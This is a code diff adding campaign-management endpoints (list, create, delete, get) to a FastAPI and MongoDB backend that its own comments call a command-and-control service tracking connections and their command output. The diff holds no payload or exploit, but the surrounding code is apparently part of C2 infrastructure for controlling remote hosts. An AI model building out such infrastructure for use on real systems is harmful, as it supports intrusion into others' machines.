@@ -10,7 +10,9 @@ app = FastAPI()
 client = MongoClient("mongodb://localhost:27017/")
 db = client["database"]
 connections = db["connections"]
+campaigns = db["campaigns"]
 
+# ----------------------------------------------------------------------------------------------
 # API endpoints to interact with the command and control service
 # list all connections
 @app.get('/c2/list-connections')
@@ -111,3 +113,46 @@ async def add_command_output(connection_id: str, request: Request):
     connections.update_one({"_id": ObjectId(connection_id)}, {"$push": {"command_output": data}})
 
     return {'message': 'Command output added successfully', 'connection_id': connection_id}
+
+# ----------------------------------------------------------------------------------------------
+# API endpoints to interact with the campaign management service
+# list all campaigns
+@app.get('/campaigns/list-campaigns')
+async def list_campaigns():
+    campaign_list = []
+
+    # Query MongoDB for a list of campaigns
+    for campaign in campaigns.find():
+        campaign_list.append(campaign)
+
+    # Return the list of campaigns
+    return {'campaign_list': campaign_list}
+
+# create a new campaign
+@app.post('/campaigns/create')
+async def create_campaign(request: Request):
+    data = await request.json()
+
+    # Insert the campaign into MongoDB
+    campaign_id = campaigns.insert_one(data).inserted_id
+
+    return {'message': 'Campaign created successfully', 'campaign_id': str(campaign_id)}
+
+# delete a campaign
+@app.delete('/campaigns/delete/{campaign_id}')
+async def delete_campaign(campaign_id: str):
+    # Delete the campaign from MongoDB
+    campaigns.delete_one({"_id": ObjectId(campaign_id)})
+
+    return {'message': 'Campaign deleted successfully', 'campaign_id': campaign_id}
+
+# get a campaign from the database
+@app.get('/campaign/{campaign_id}')
+async def get_campaign(campaign_id: str):
+    # Retrieve the campaign from MongoDB
+    campaign = campaigns.find_one({"_id": ObjectId(campaign_id)})
+    if not campaign:
+        return HTMLResponse(content="Campaign not found", status_code=404)
+
+    # Return the campaign
+    return {'campaign': campaign}
